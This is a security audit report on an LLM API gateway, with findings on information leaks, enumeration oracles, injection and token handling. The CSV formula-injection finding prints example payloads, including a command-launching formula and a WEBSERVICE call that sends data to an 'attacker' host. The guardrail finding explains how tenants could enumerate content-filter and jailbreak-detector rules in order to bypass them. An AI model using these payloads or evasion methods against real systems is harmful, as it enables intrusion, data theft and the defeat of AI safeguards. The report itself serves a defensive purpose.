title: /metrics is unauthenticated and leaks model aliases, provider names, circuit-breaker state, traffic volumes and Go runtime internals
evidence: routes.go:19-24 comment then handler: '// Prometheus 抓取端点（P2 #6）：文本 v0.0.4，零依赖；建议仅内网/监控网段可达' / '（LB/网关层限制），故不做 JWT 鉴权——鉴权会让抓取端无法简单配置。' / 'r.GET("/metrics", func(c *gin.Context) {' ... 's.mx.WritePromRender(c.Writer, s)' — no AuthMiddleware, no token, no CIDR allowlist, no shared secret. Complete series/label inventory rendered (metrics/prom.go:126-153): gw_uptime_seconds, gw_active_connections, gw_requests_per_second, gw_model_requests_per_second with label model="...", gw_model_errors_1m with label model="...", gw_upstream_healthy with labels provider="...",protocol="...", gw_upstream_consecutive_failures with labels provider="...",protocol="...", plus 10 go_* series (heap allocs/frees/objects/released/stacks bytes, GC cycles, mutex wait, goroutines-created, goroutines). The model label value is the request's model string: prom.go:136 'l := ... + promEsc(q.Model) + ...' where q.Model comes from metrics.go:99 'out = append(out, QPSInfo{Model: m, QPS: float64(total) / 60, Errs1m: errs})'; the provider label is the operator-chosen provider display name via admin/prom.go:21 'Name: h.Provider' ← slb/slb.go:352 'h := Health{ProviderID: id, Provider: p.Name, Protocol: p.Protocol, Healthy: true}'.
impact: Anyone able to open a TCP connection to the one published port can read, with no credentials: (a) which model aliases / real upstream model names are live and being used right now (60 s window) and at what rate — i.e. which customers/models are active; (b) internal vendor/provider names and protocols (infrastructure fingerprint of which commercial LLM accounts the platform buys); (c) per-provider circuit-breaker health and consecutive-failure counts, i.e. exactly when the platform is degraded (attack/pivot timing, and it announces which upstream is down — see disclosure-4 for how that state is then echoed to tenants); (d) total QPS, active connection count, and process uptime (restart times); (e) Go heap/GC/goroutine figures. Aggravating factors: the shipped deployment publishes this route on the same port as the admin UI (docker-compose.yml:9-10 '- "${PORT:-8080}:8080"'), there is no config toggle or separate bind address anywhere in internal/config/config.go, http.Server is built with no timeouts at all (main.go:126 'srv := &http.Server{Addr: fmt.Sprintf(":%d", cfg.ListenPort), Handler: engine}'), and the MaxConnections admission control lives only inside the gateway auth middleware (gateway.go:195), so /metrics is exempt while every scrape serialises on metrics.promMu (prom.go:113-114) and balancer.mu (slb.go:348-349) — cheap unauthenticated connection/goroutine pile-up.
recommendation: Enforce the boundary in-process instead of documenting it: serve /metrics on a separate localhost-only port, or require a bearer token / mTLS / CIDR allowlist, and add config flags (e.g. METRICS_LISTEN_ADDR / METRICS_TOKEN) so operators do not depend on an external LB rule. For the unauthenticated view, drop or hash identity labels (emit provider_id / alias digest rather than operator-chosen provider names) and gate the go_* runtime block.
mitigations_checked: Label values are escaped for the exposition format (prom.go:43-45 promEsc), so no Prometheus text injection; provider BaseURLs, API keys, key labels and per-key volumes are NOT in the payload; the last breaker error string (which contains upstream bodies) is deliberately not mapped into PromUpstream (admin/prom.go:20-25 vs slb.go:344 Health.LastError); there is no CORS middleware, so a cross-origin browser page cannot read the response body — the exposure is network-reachable anonymous scraping, which nothing in-process prevents.

title: Model-name oracle: 404 vs allowlist-403 lets any API key enumerate the whole platform inventory, including models its key is denied
evidence: Resolution failure is reported as non-existence: gateway.go:356-360 'if !ok {' / 'ap.errMsg = "unknown model alias: " + cr.Model' / 'clientError(c, clientProto, http.StatusNotFound,' / 'fmt.Sprintf("unknown model %q: not a configured alias and no upstream serves this model name", cr.Model),'. The per-key allowlist check runs strictly later, gateway.go:370-373 'if !apiKey.AllowsModel(cr.Model) {' / 'ap.errMsg = "model not allowed for api key"' / 'clientError(c, clientProto, http.StatusForbidden,' / 'fmt.Sprintf("model %q is not allowed for this api key", cr.Model),'. Resolution spans both configured aliases (gateway.go:335 'ups, ok := snap.Aliases[cr.Model]') and implicit real upstream model ids (gateway.go:351 'if iups := snap.UpstreamModels[cr.Model]; len(iups) > 0 {') — exactly the set the 403 branch is meant to conceal. /v1/models correctly hides the denied set (gateway.go:132-133 'if !rec.AllowsModel(name) {' / 'continue') but then discloses vendor attribution for visible ones at gateway.go:180-181 'if ups := snap.Aliases[name]; len(ups) > 0 {' / 'owner = ups[0].ProviderName'.
impact: A tenant holding one cheap API key — including a key with a restrictive AllowedModels list, or one whose list is empty (AllowsModel returns true for everything, model/model.go:52-54) — can binary-search the entire model inventory purely from status codes and message wording: 404 = not configured anywhere; 403 = configured, live, and forbidden to me. That defeats the confidentiality half of the per-key model allowlist and enumerates enabled aliases plus the vendors' true model ids (snap.Aliases/snap.UpstreamModels are built only from enabled aliases and enabled providers, runtime/manager.go:231-258), so the attacker learns the platform's paid upstream catalogue and which commercial backend serves each public alias (via owned_by in /v1/models). Foothold for targeted abuse: probing for expensive/unreleased models to burn budget, selecting vendor-specific jailbreaks by backend, and later allowlist-widening or billing-manipulation attempts.
recommendation: Collapse the two answers into one indistinguishable reply: resolve and authorize together and return a single generic model_not_found-shaped 400/404 whether the name is unknown, disabled, or merely not permitted (log the true reason in ap.errMsg only, as writeLog already persists). Replace the provider name in owned_by with a static value.
mitigations_checked: The oracle requires a valid enabled key (gateway.go:215-216 'rec, ok := snap.APIKeys[crypto.Sha256Hex(key)]' / 'if !ok || !rec.Enabled {' aborts first), so it is not anonymous; rate limiting does not protect it because both branches return before the limiter runs (gateway.go:410); /v1/models itself is correctly filtered by AllowsModel (gateway.go:132, 143).

title: Upstream HTTP error bodies are forwarded verbatim to tenants (raw-bytes fallback), bypassing the output guard and leaking vendor account/infra detail
evidence: adapter/sse.go:591-613 'func ExtractError(p Protocol, body []byte) string {' — when neither the OpenAI-shaped nor the Anthropic-shaped error.message parses, it falls through to raw bytes: 'if len(body) > 200 {' / 'body = body[:200]' / '}' / 'return string(body)'. gateway.go:529-543 forwards it together with the upstream status: 'if resp.StatusCode < 200 || resp.StatusCode >= 300 {' / 'body, _ := io.ReadAll(io.LimitReader(resp.Body, 64<<10))' / 'msg := adapter.ExtractError(up.Protocol, body)' / 'clientError(c, clientProto, resp.StatusCode,' / 'fmt.Sprintf("upstream returned %d: %s", resp.StatusCode, msg),'. Same pattern mid-stream for upstream error events: gateway.go:660-661 'if chunk.Err != "" {' / '_ = sw.Fail(chunk.Err)' (adapter/sse.go:474-480 writes that message straight into the client's SSE error frame).
impact: A tenant that trips any non-retryable upstream failure (401/403/404/429, or any 5xx when failover is disabled, gateway.go:532 'retryable := snap.Failover.Enabled && ...') receives (a) the provider's exact HTTP status and (b) up to 200 bytes of the raw response body whenever it is not shaped JSON — CDN/LB HTML error pages, internal hostnames, vendor request ids, storage bucket or tenant strings, plain-text billing statements. Because all tenants of a provider share one upstream key (runtime/manager.go:244-246 ResolvedUpstream{... APIKey: p.APIKey ...}), this crosses tenant boundaries with shared-account state: organization-level quota exhaustion, 'exceeded your current quota ... $N' billing text, account-suspended notices — and lets any tenant poll the provider relationship on demand. Additionally, this text is emitted through clientError and never passes guard.CheckOutput, so a malicious or compromised provider (BaseURL is operator-set and provider-side compromise is in scope) can inject arbitrary unfiltered, unmasked content into tenant-visible responses on all three protocols, defeating the output-guard control that ordinary model content goes through. The 'upstream returned %d: ' prefix also lets a crafted vendor body masquerade as gateway policy (e.g. a fake 'your account will be terminated, re-authenticate at ...').
recommendation: Send tenants a fixed, protocol-correct envelope with a mapped message (e.g. 'upstream rejected the request (4xx)') and keep the raw body only in the admin-visible call log (ap.errMsg) and circuit-breaker record. On the streaming path, replace 'sw.Fail(chunk.Err)' with a generic 'upstream stream error'. If verbatim vendor text is genuinely wanted, gate it behind an explicit strict-passthrough setting that still routes the string through the output guard.
mitigations_checked: Body read is size-bounded (64 KB) and the message is cut to 200 bytes, so no buffer amplification; clientError serialises through json.Marshal (adapter/adapter.go:850-855) so there is no JSON injection from this path; retryable failures are not sent directly (gateway.go:533-537 returns frRetry) — but see disclosure-4, which leaks the same strings on the terminal path. Faithful passthrough of 2xx bodies is an accepted user decision; this finding is about error bodies that the gateway itself composes.

title: Terminal 502 echoes Go transport errors to the tenant, exposing internal upstream host:port URLs despite an in-code claim that it does not
evidence: gateway.go:517-519 captures the raw transport error and asserts it will not be shown: 'resp, err := s.httpClient.Do(req)' / 'if err != nil {' / 'ap.errMsg = err.Error() // 审计另有 UpstreamProvider 列；面向客户端的错误不泄漏上游名'. The retry loop then promotes that exact string into the client response: gateway.go:467-469 'case frRetry:' / 'lastErr = ap.errMsg' / 'continue', and gateway.go:472-476 'ap.status = "error"' / 'ap.errMsg = lastErr' / 's.mx.RecordError(reqID, lastErr)' / 'clientError(c, clientProto, http.StatusBadGateway,' / '"all upstreams unavailable: "+lastErr, "upstream_error", "bad_gateway")'. That err.Error() is a *url.Error embedding the full outbound URL and resolved address, e.g. 'Post "http://10.8.0.12:8000/v1/chat/completions": dial tcp 10.8.0.12:8000: connect: connection refused' (URL built at adapter/adapter.go via BuildUpstreamRequest from up.BaseURL, runtime/manager.go:245 'Protocol: p.Protocol, BaseURL: p.BaseURL, APIKey: p.APIKey'). The retryable-HTTP branch contributes provider bodies the same way: gateway.go:534 'ap.errMsg = fmt.Sprintf("HTTP %d: %s", resp.StatusCode, msg)'.
impact: Any API-key holder can make the gateway disclose the private scheme/host/port of every upstream it dials — self-hosted vLLM/Ollama boxes, internal proxy gateways, non-default ports, cluster DNS names — simply by sending traffic while those endpoints are unreachable, which the attacker can both induce (burden a slow upstream) and observe, since breaker state is published unauthenticated on /metrics (disclosure-1). This is network-topology disclosure into the operator's private infrastructure and a direct input to SSRF/pivot planning; it also contradicts the invariant asserted in the code comment at gateway.go:519, so it will pass review unnoticed. The last attempted provider error body ('HTTP <code>: <200-byte snippet>') is appended to the same message, adding the disclosure-3 vendor detail to the 502 path.
recommendation: Never compose client-facing text from ap.errMsg after a transport failure: emit a static 'all upstreams unavailable (request_id=...)' message and keep the transport string only in the call log, s.bl.RecordFailure and s.mx.RecordError. If operators want richer errors, gate them behind an explicit per-key verbose-errors flag (off by default) that strips URLs and addresses.
mitigations_checked: Provider display names are indeed absent from the transport error string, so the comment is partly correct — the leak is the URL/address and body snippet; the identical string logged at gateway.go:520 'log.Printf("[upstream] %s %s: %v", up.ProviderName, up.UpstreamModel, err)' goes to server stdout only; no stack trace is involved.

title: Metrics label cardinality is unbounded and fed by the client-controlled model field on request paths that run before rate limiting
evidence: metrics.go:56-63 'func (mt *Metrics) Observe(model string, isErr bool) {' ... 's := mt.stats[model]' / 'if s == nil {' / 's = &ModelStat{lastSec: now}' / 'mt.stats[model] = s' — the map key is the request's model string, with no key cap, no length cap and no eviction anywhere (ModelStat is 'buckets [60]int64' + 'errs [60]int64' = 960 B per key, metrics.go:10-14; searching the whole backend for delete-on-stats returns only these two assignment sites). The key is attacker-chosen: gateway.go:334 'ap.alias = cr.Model' is assigned immediately after parsing, before every validation branch, and gateway.go:314-319 'defer func() {' ... 's.mx.Observe(ap.alias, ap.status != "ok")' records it even when the request is rejected — including unknown models (gateway.go:356-361) and denied models (gateway.go:370-376), both of which return before the limiter at gateway.go:410 'if ok2, hit := s.rl.Allow(snap, apiKey.ID, ap.alias); !ok2 {'. cr.Model has no length bound (adapter/adapter.go:108 'Model       string          `json:"model"`' with only the empty check at adapter.go:120-122 'if raw.Model == "" {' / 'return nil, fmt.Errorf("model is required")' / '}'); the only ceiling is the 16 MiB body read at gateway.go:322. Every accumulated key is then re-emitted verbatim to unauthenticated readers: metrics/prom.go:135-138 'for _, q := range qps {' / 'l := ...promEsc(q.Model)...' / 'writeMetric(w, "gw_model_requests_per_second", "Per-model requests per second (60s window)", l, q.QPS)'.
impact: A single low-privilege tenant can permanently grow gateway process memory at line rate: each bogus or denied model name creates a never-freed ~1 KB-plus entry (label length up to megabytes), because the 404/403 paths bypass both the rate limiter and the quota check. Nothing reclaims it, so growth is monotonic for the process lifetime and ends in OOM of the single-node gateway — every tenant down (authed-but-severe). The same attacker-chosen strings are then served to every anonymous /metrics scrape, converting N transient probes into permanent per-scrape bandwidth/CPU amplification on the monitoring path (multi-MB unauthenticated responses, serialised under metrics.promMu, with an empty promMu queue growing per request since MaxConnections does not cover /metrics). It is simultaneously a cross-tenant disclosure: model names one tenant probes become visible in the label set to everyone reading /metrics.
recommendation: Record metrics only for resolved, authorized aliases (call Observe with the name after the allowlist check, or with a fixed 'unresolved' bucket), cap label length (the DB column already assumes 64: model/model.go:120 'Alias   string    `gorm:"uniqueIndex;size:64"`'), add a max-keys bound with LRU/idle eviction in Metrics, and move the 404/403 rejection paths behind the rate limiter (or a cheap per-key pre-check) so no state is mutated pre-authorisation.
mitigations_checked: promEsc (prom.go:43-45) prevents label/newline injection into the exposition text; AuthMiddleware runs first (gateway.go:215-221) so anonymous clients cannot feed the map; gateway.go:195-200 MaxConnections bounds concurrent in-flight gateway requests but not retained map entries. Adjacent and same root cause: non-ok calls are always audited (gateway.go:257-258 'if status != "ok" {' / 'return true'), so each probe also inserts a call_logs row carrying the same attacker-controlled alias string — unbounded DB growth.

title: Guardrail block reasons echo the exact matched keyword and rule names to the tenant, giving a blocklist-enumeration / bypass oracle
evidence: Input block: gateway.go:399-405 'if blockedReason != "" {' ... 'clientError(c, clientProto, http.StatusBadRequest,' / '"request blocked by content policy: "+blockedReason,' / '"content_policy_violation", "content_filtered")'. The reason string names the matched rule and its literal value: guard/engine.go:81 'vd.BlockReason = fmt.Sprintf("命中敏感词策略 [%s/%s]", kw.Raw.Category, f.Value)' where f.Value is the dictionary entry itself (engine.go:77 'f := Finding{Type: "keyword", Value: display(kw.Raw.Word), Category: "keyword." + kw.Raw.Category, Action: kw.Raw.Action}'), engine.go:103 'vd.BlockReason = fmt.Sprintf("命中 PII 拦截规则 [%s]", r.Raw.Name)', engine.go:117 'vd.BlockReason = fmt.Sprintf("疑似提示词注入/越狱攻击 [%s]", inj.Raw.Name)'. Output side: gateway.go:582-584 '"response blocked by content policy: "+vd.BlockReason' (built at engine.go:139 'vd.BlockReason = fmt.Sprintf("输出命中敏感词策略 [%s]", display(kw.Raw.Word))') and in-band on streams at gateway.go:788 '_ = sw.Fail("output blocked by content policy: " + vd.BlockReason)'. The only redaction is a 12-rune cut: engine.go:215-221 'func display(word string) string {' / 'r := []rune(word)' / 'if len(r) > 12 {' / 'return string(r[:12]) + "…"'.
impact: Every tenant with an API key receives a precise oracle over the platform's secret guardrail configuration: the category, the rule name, and up to the first 12 characters of the banned literal. Because the response prints the matched word, a probe is a definitive membership test (200 = not in the list, 400 = the word is printed), turning the block/PII/injection dictionary into tenant-readable data recoverable by iteration; for regex/exact modes the rule identity is disclosed too. Injection-rule names reveal exactly which prompt-injection/jailbreak detectors exist, so an attacker paraphrases around them. The output variants (gateway.go:582, 788) let an attacker drive the model into producing a banned literal and read back which one matched, i.e. use the model as a remote oracle to exfiltrate a target deployment's keyword list. This dismantles the confidentiality of the REQ-008..011 control for anyone who can buy one key.
recommendation: Return a static, non-informative message to clients ('request blocked by content policy' / 'response blocked by content policy', at most a coarse category) and keep rule name, keyword and findings exclusively in the admin-side audit row — ap.category / ap.reason / ap.findings are already persisted by writeLog (gateway.go:270-280). Apply the same rule to the streaming Fail frame and to the buffered output block.
mitigations_checked: The full findings array is not sent to the client (it is only serialised into the DB via guard.FindingsJSON at gateway.go:397), so per response only the first matched rule leaks ('if vd.Blocked && blockedReason == ""' at gateway.go:386 keeps the first reason); PII mask-mode substitution happens before forwarding so raw PII is not echoed back; blocks are always audited regardless of sampling (gateway.go:257-258), so moving detail out of the client message costs no forensics; guard failures fail open but silently (engine.go:66-70), which is a separate control weakness, not a disclosure.

title: Admin username enumeration before credential verification (lock-state 403 branch + bcrypt-only-for-existing-users timing asymmetry)
evidence: auth.go:33-39 looks the account up and answers about its state before any secret is checked: 'var u model.AdminUser' / 'if err := s.db.Where("username = ?", req.Username).First(&u).Error; err != nil {' / 's.fail(c, http.StatusUnauthorized, 40102, "用户名或密码错误")' / 'return' / '}' / 'if u.IsLocked() {' / 's.fail(c, http.StatusForbidden, 40301, "账户已被锁定，请稍后再试或联系管理员解锁")'. For an existing account with a wrong password the reply is byte-identical to the unknown-user reply (auth.go:76-79 'if err := bcrypt.CompareHashAndPassword([]byte(u.PasswordHash), []byte(req.Password)); err != nil {' / 's.onMFAFail(&u)' / 's.fail(c, http.StatusUnauthorized, 40102, "用户名或密码错误")'), so only the locked branch differs — and that branch is attacker-triggerable: auth.go:114-119 'func (s *Server) onMFAFail(u *model.AdminUser) {' / 'u.FailedLogins++' ... 'if u.FailedLogins >= 5 {' / 'loc := time.Now().Add(15 * time.Minute)'. Non-existent names never reach onMFAFail (the First() at auth.go:34 already returned) and can never lock, and bcrypt never runs for them, so both a status-code and a timing oracle exist. The seeded username is public knowledge (main.go:179 'u := model.AdminUser{Username: cfg.AdminUser, PasswordHash: string(hash)}'; docker-compose.yml:17 '- ADMIN_USER=${ADMIN_USER:-admin}').
impact: Unauthenticated attackers can confirm which admin usernames are real: five wrong passwords against a candidate flips a live account to 40301 while a phantom name stays at 40102 forever — a deterministic, replayable existence probe; and independently, response time separates existing from non-existing users because bcrypt (DefaultCost) runs only for rows found in the DB. Because the admin plane is single-role and all-powerful (no role field on model.AdminUser, model/model.go:13-24; every route in routes.go:43-148 is one flat s.AuthMiddleware()), one confirmed username is a complete target for password spray/credential stuffing against the console that owns every provider API key, every tenant key, config export and all prompt/response audit text. The same probe doubles as a rolling 15-minute lockout of the administrator (5 requests per 15 min per account, no per-IP throttle anywhere on /auth/login), and the '联系管理员解锁' wording confirms to an intruder that a human will be paged — useful for phishing the operator.
recommendation: Do constant work first: on unknown user, run bcrypt against a fixed dummy hash, then answer with one identical 401 envelope for unknown-user / wrong-password / locked (put lock state in a field only after correct credentials). Add per-IP (and per-IP-per-account) login throttling so the probe and the lockout are expensive.
mitigations_checked: The login message text does not distinguish unknown user from wrong password (both 40102), so the naive message oracle is closed; no user-listing endpoint is reachable without a JWT (routes.go:133 'api.GET("/users", s.AuthMiddleware(), s.listUsers)'); /auth/me requires a token; MFA (auth.go:86-107) reduces the payoff of a guessed password but does not remove the enumeration.

title: CSV formula injection: client-controlled request_id and model_alias are exported unescaped into admin audit spreadsheets
evidence: audit.go:99-105 'w := csv.NewWriter(&sb)' / 'w.Write([]string{"request_id", "created_at", "api_key", "protocol", "model", ...})' / 'for _, r := range rows {' / 'w.Write([]string{r.RequestID, r.CreatedAt.Format(time.RFC3339), r.APIKeyLabel, r.Protocol,' / 'r.ModelAlias, upstreamLabel(r.UpstreamProvider, r.UpstreamModel),' ... 'strconv.FormatBool(r.Blocked), r.BlockReason})' — there is no leading =/+/-/@ neutralisation anywhere, and Go's encoding/csv quotes a field only for delimiter/quote/newline, so a cell beginning with '=' is emitted bare. Served as a download at audit.go:108-109 'c.Header("Content-Disposition", "attachment; filename=call-logs.csv")'. Both exported fields are attacker-controlled from the gateway: gateway.go:83-87 'func resolveRequestID(c *gin.Context) string {' / 'if v := strings.TrimSpace(c.GetHeader("X-Request-ID")); v != "" && len(v) <= 128 {' / 'return v' (only a length bound; stored as the audit primary string at gateway.go:272 'RequestID: p.requestID'), and gateway.go:334 'ap.alias = cr.Model' persisted as model_alias (gateway.go:273). Same pattern in the operation-log export (audit.go:180-181) and the token-stats export (admin/tokenstats.go:233).
impact: Any API-key holder can plant a formula in a call-log row that an operator later exports and opens in Excel/LibreOffice/Numbers, e.g. X-Request-ID: '=cmd|'/C calc'!A0' or '=WEBSERVICE("http://attacker/?d=...")&...' — executed with the privileges of the security operator on the admin workstation, i.e. a tenant-to-management-plane break that does not touch the gateway at all (the operator's machine holds the console session and typically VPN/SSH credentials; the same header also yields data-exfiltration formulas reading the exported rows, which contain other tenants' key labels and block reasons). The payload is invisible in gateway logs except as the raw header, and 128 bytes is enough for both retrieval and execution payloads.
recommendation: Add one export helper that prefixes a leading apostrophe (or tab) to any text cell starting with = + - @ or CR/LF and use it in all four CSV/text exports; separately, validate X-Request-ID against a safe charset (e.g. [A-Za-z0-9._:-]{1,128}) instead of only bounding its length.
mitigations_checked: encoding/csv prevents field/row-structure forgery (extra columns/rows); the export requires an admin JWT (routes.go:113 'api.GET("/audit/calls/export", s.AuthMiddleware(), s.exportCallLogs)') and is served with Content-Disposition attachment so the browser never renders it; the SPA view is safe because React escapes text nodes (no dangerouslySetInnerHTML anywhere in frontend/src) — the risk is spreadsheet interpretation of the exported file only; row count is capped at 10000 (audit.go:97).

title: Client-controlled X-Request-ID and model name are interpolated unescaped into SSE JSON frames and forwarded to upstream vendors
evidence:
sse.go:243-251 builds the opening frame with fmt.Sprintf and raw %s verbs for two attacker-controlled values: 'return s.raw("event: message_start
data: " + fmt.Sprintf(' followed by a Go raw-string literal containing '"id":"%s" ... "model":"%s"' and then 's.id, s.model) + "

" + ...)'. The same unescaped %s interpolation recurs at sse.go:253-255 (responses 'id'/'model'), 257-259 (chat 'id'/'model'), 280-281, 300-301, 326-327, 360-361 ('"id":"%s","name":"%s"' from upstream tool id/name), 387-389, 439 and 464-465 ('finish_reason":"%s"' from upstream). s.id is the client header (gateway.go:84 'if v := strings.TrimSpace(c.GetHeader("X-Request-ID")); v != "" && len(v) <= 128 {', threaded in at gateway.go:629 'sw := adapter.NewSSEWriter(clientProto, c.Writer, reqID, cr.Model)' and sse.go:222-226 'func NewSSEWriter(clientProto Protocol, w http.ResponseWriter, respID, model string) *SSEWriter {'); s.model is the request body's model field. The unsanitised value is also forwarded to the vendor: gateway.go:513-514 '// 链路追踪透传（P1 #1）：上游可凭此头回查网关审计（call_logs.request_id）' / 'req.Header.Set("X-Request-ID", reqID)'.
impact: A double quote or brace inside the 128-byte X-Request-ID (or inside the model name) breaks or extends the JSON object the client receives, so a tenant can make the gateway emit arbitrary JSON keys and values in a stream — it invalidates any downstream consumer that trusts the 'model' or 'id' field for accounting or attribution, corrupts SSE frame integrity for strict clients, and lets content bypass the gateway's own serialisation (Open/Finalize frames are not guarded, only Delta/Fail bodies). Forwarding the same value as X-Request-ID plants attacker-controlled text into the vendor provider's request logs (log forgery against the operator's commercial account, and forged trace ids that collide with or displace other tenants' request ids, undermining the very correlation the comment describes).
recommendation: Serialise these frames with encoding/json (or json.Marshal the id/model exactly as delta text already is at sse.go:268 'tj, _ := json.Marshal(text)'), validate X-Request-ID against a safe charset, and send the upstream trace header as a server-generated id correlated in the audit row rather than echoing client input.
mitigations_checked: Delta/reasoning/tool-argument text is correctly marshalled (sse.go:268, 291, 366, 400), so the injection surface is confined to id/model/finish/name fields; Go's header parser rejects CR/LF in header values so response/header splitting is not achievable; the injected content reaches only the requesting client (no cross-tenant fan-out); WebSocket audit fan-out serialises CallLog through encoding/json, so those frames are not injectable.

title: Raw err.Error() (GORM/SQL-driver text, parse and file internals) returned to admin clients and toast-rendered verbatim; also echoed to tenants on gateway parse errors
evidence: Admin handlers concatenate driver errors into responses: models.go:112 's.fail(c, 500, 50001, "创建失败: "+err.Error())' and models.go:166 's.fail(c, 500, 50001, "更新失败: "+err.Error())'; providers.go:76 and providers.go:125 (same two strings), providers.go:172 's.fail(c, 400, 40001, "Base URL 非法: "+err.Error())', providers.go:188 's.ok(c, gin.H{"ok": false, "latency_ms": latency, "message": "连接失败: " + err.Error()})', providers.go:350 '"导入失败: "+err.Error()'; configstatus.go:45 's.fail(c, http.StatusInternalServerError, 50001, "重载失败: "+err.Error())', configstatus.go:55 's.fail(c, http.StatusBadRequest, 40001, err.Error())' (rollback), configstatus.go:65 '"导出失败: "+err.Error()'; backup.go:28 '"备份失败: "+err.Error()' and backup.go:82 '"恢复失败: "+err.Error()'; guard.go:158 's.fail(c, http.StatusBadRequest, 40001, "CSV 解析失败: "+err.Error())' plus guard.go:51/76/241/266/348/375 and apikeys.go:45. These strings reach the operator's screen verbatim: frontend/src/api/client.ts:58-59 'if (body.code !== 40101 && body.code !== 40102 && body.code !== 40103) {' / 'message.error(body.message || i18n.t('common.requestFailed'));' and client.ts:79-80 'if (bizMessage) {' / 'message.error(bizMessage);'. The same habit exists on the tenant-facing path: gateway.go:331 'clientError(c, clientProto, http.StatusBadRequest, err.Error(), "invalid_request_error", "bad_request")' and gateway.go:100/105 in CountTokens, echoing wrapped unmarshal errors from adapter/adapter.go:117-118 'if err := json.Unmarshal(body, &raw); err != nil {' / 'return nil, fmt.Errorf("invalid JSON body: %w", err)' (and adapter.go:136-137 'invalid messages: %w').
impact: DB-level failures write driver text into HTTP responses and browser toasts: table/column and constraint names, SQL dialect, and on MySQL/Postgres the offending value (e.g. "Duplicate entry '…' for key '…'"), so submitted secrets or internal identifiers get reflected into logs, screenshots and any error-reporting collector. On the gateway side, err.Error() of a json.UnmarshalTypeError discloses private Go struct field names and types of the request models to any API-key holder — a free map of the parser for building decoder-confusing or split-parsing payloads (relevant because the gateway re-serialises requests across protocols). Rollback/restore failures additionally echo snapshot parse internals (runtime/bundle.go:156-157 'if err := json.Unmarshal([]byte(target.SnapshotJSON), &b); err != nil {' / 'return "", fmt.Errorf("版本快照损坏: %w", err)'), which can disclose stored snapshot content.
recommendation: Introduce one error helper that logs the wrapped error server-side and returns a stable code plus fixed text (s.fail(500, 50001, 'internal error; see server log')), and classify request-parse failures into a small allow-list of client-safe messages instead of echoing err.Error().
mitigations_checked: No stack traces reach any client: recovery is gin.Recovery() (main.go:95 'engine.Use(gin.Recovery())'), which prints the trace to the server log and returns a bare 500; SQL injection is not possible through these paths since all shown queries use bound parameters (e.g. models.go:126 's.db.First(&a, id)'); secret-bearing columns are excluded from JSON (model/model.go:37 KeyHash with gorm tag size:64;index and json:"-", model/model.go:107 APIKeyEnc with type:text and json:"-", model/model.go:108 APIKey runtime-only with json:"-"), so error strings are the only incidental leak channel; admin handlers are JWT-gated (there are no lower-privilege roles, so no cross-role leak).

title: Rate-limit and quota errors disclose internal rule ids, thresholds and account-level quota volumes to tenants
evidence: gateway.go:410-414 'if ok2, hit := s.rl.Allow(snap, apiKey.ID, ap.alias); !ok2 {' / 'ap.status = "rate_limited"' / 'ap.reason = fmt.Sprintf("rate limit rule#%d: %d reqs/%ds", hit.ID, hit.MaxRequests, hit.WindowSeconds)' / 'clientError(c, clientProto, http.StatusTooManyRequests,' / 'ap.reason, "rate_limit_error", "rate_limit_exceeded")' — the DB row id and the full rule parameters are the client-visible message. Quota path, gateway.go:429-433 'ap.reason = fmt.Sprintf("quota#%d (%s/%s) 已达上限 %d/%d",' / 'over.QuotaID, over.Kind, "current", over.Used, over.Limit)' ... 'fmt.Sprintf("quota exceeded (%s): %d of %d used", over.Kind, over.Used, over.Limit),'.
impact: Tenants learn primary-key ids of rate-limit and quota rows (ids are sequential, so the count of platform policies and the shape of the admin URLs/audit rows leak) and learn exact enforcement thresholds, letting them pace traffic just under the limit and distinguish 'rate limited' from 'quota exhausted' — i.e. which shared resource is depleted and how much headroom remains. Mostly the caller's own limits, so impact is modest, but it is a needless internal-state oracle and the last tenant-visible internal identifier once the other messages are generalised.
recommendation: Return a generic 'rate limit exceeded' / 'quota exceeded' message (with Retry-After where meaningful) and keep rule id/threshold detail in ap.reason, which writeLog already persists (gateway.go:270-280) for the admin console.
mitigations_checked: Neither message names the degrade target alias (gateway.go:421-426 changes ap.alias silently), so the fallback model catalogue is not disclosed; no provider names, key labels or other tenants' identifiers appear in these strings; both conditions are already recorded server-side (gateway.go:411, 429).

title: Admin JWT is accepted in a URL query string for the audit WebSocket, with no Origin check on the handshake
evidence: routes.go:116-118 '// 实时调用审计流（P2 #5）：浏览器 WS 无法自定义 Authorization 头，token 走查询串，' / '// 鉴权在升级前完成（401 不产生半开 WebSocket）。' / 'api.GET("/audit/ws", s.auditWS)'; auditws.go:30-33 '// 1) 查询串 JWT 鉴权（浏览器 WS 无法带 Authorization 头）' / 'claims, err := auth.Parse(s.secret, c.Query("token"))' / 'if err != nil || claims == nil {' / 'c.AbortWithStatusJSON(http.StatusUnauthorized, gin.H{"code": 40101, ...})'. After that the handler upgrades and streams every persisted call-audit row (auditws.go:72 'msgs, cancel := s.al.Broadcaster().Subscribe()') and validates only Upgrade/Connection/Sec-WebSocket-Key (auditws.go:38-52) — no Sec-WebSocket-Origin check anywhere.
impact: The long-lived bearer credential for the entire admin plane is placed in a URL, where it is routinely recorded outside the application: reverse-proxy/LB and CDN access logs, corporate egress/proxy logs, and any RUM/error-reporting SDK that captures location.search. The project's own deployment front-ends one published port (docker-compose.yml:9-10), so 'nginx in front' is the documented norm and every such log line is a replayable admin session; the token grants everything, including per-tenant prompt/response text ('/audit/calls/:request_id' returns input_text/output_text, audit.go:81-82) and /config/export. The missing Origin check means nothing binds the socket to the console origin, so any holder of the logged token can also open the live audit stream.
recommendation: Exchange the JWT for a short-lived single-use WebSocket ticket over an authenticated POST (keeping the JWT in the Authorization header) and put only the opaque handle in the query string; validate Sec-WebSocket-Origin against the deployment origin; document that proxies must not log query strings on /api/admin/v1/audit/ws.
mitigations_checked: The application's own access log never captures the query string — main.go:109 'path := c.Request.URL.Path' and main.go:116-117 'log.Printf("[access] %3d  %-6s %s  %s  %s",' with 'path, time.Since(start), c.ClientIP())' — so the token does not land in gateway stdout; the endpoint is not anonymous (bad/absent token → 401 before upgrade, auditws.go:31-35), and Referrer-Policy/CSRF are not additional vectors here since no cookie-based auth exists (token is sent in the Authorization header by client.ts:40-41).
